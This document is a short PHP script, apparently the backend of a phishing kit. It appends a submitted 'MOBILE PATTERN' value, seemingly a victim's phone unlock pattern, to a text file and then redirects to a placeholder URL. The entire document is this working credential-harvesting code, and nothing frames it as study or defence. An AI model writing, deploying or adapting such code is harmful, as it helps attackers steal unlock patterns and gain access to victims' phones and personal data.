<?php
file_put_contents("pattern.txt", "MOBILE PATTERN : " . $_POST['pattern'] . "\n", FILE_APPEND);
header('Location: redirecturl');
exit();
?>